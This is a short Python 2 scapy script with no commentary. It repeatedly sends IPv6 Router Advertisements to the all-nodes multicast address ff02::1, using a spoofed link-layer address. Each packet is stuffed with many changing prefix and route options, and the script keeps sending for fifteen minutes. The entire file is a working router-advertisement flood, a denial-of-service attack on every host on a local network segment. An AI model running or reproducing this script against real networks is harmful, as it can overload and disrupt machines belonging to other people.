from scapy.all import *
import netaddr,sys,time

restInterval = 900
alphabet = "0123456789abcdef"

a = IPv6()
a.dst = "ff02::1"

b = ICMPv6ND_RA()

c = ICMPv6NDOptSrcLLAddr()
c.lladdr = "00:50:56:24:3b:c0"

d = ICMPv6NDOptMTU()

e = ICMPv6NDOptPrefixInfo()
e.prefixlen = 64

f = ICMPv6NDOptRouteInfo()
f.plen = 64
f.prf = 1
f.display()

i=j=k=l=m=n=o=p=0
starttime = time.time()

while p < 16:
    currenttime = time.time()
    if currenttime - starttime > restInterval:
        print "Reached time to quit"
        sys.exit()
    pkt = a/b/c/d
    prefix = ""
    for r in range(0,18):
        #print str(i)+","+str(j)+","+str(k)+","+str(l)+","+str(m)+","+str(n)+","+str(o)+","+str(p)+","
        prefix = alphabet[p%16]+alphabet[o%16]+alphabet[n%16]+alphabet[m%16]+":"+alphabet[l%16]+alphabet[k%16]+alphabet[j%16]+alphabet[i%16]+"::"
        e.prefix = prefix
        #print e.prefix
        i += 1
        j = int(i/16)
        k = int(j/16)
        l = int(k/16)
        m = int(l/16)
        n = int(m/16)
        o = int(n/16)
        p = int(o/16)
        pkt = pkt/e
        
    for q in range(0,17):
        f.prefix = alphabet[q%16]+alphabet[(q+1)%16]+alphabet[(q+2)%16]+alphabet[(q+3)%16]+"::"
        pkt = pkt/f
        
    send(pkt,verbose=0)

    

                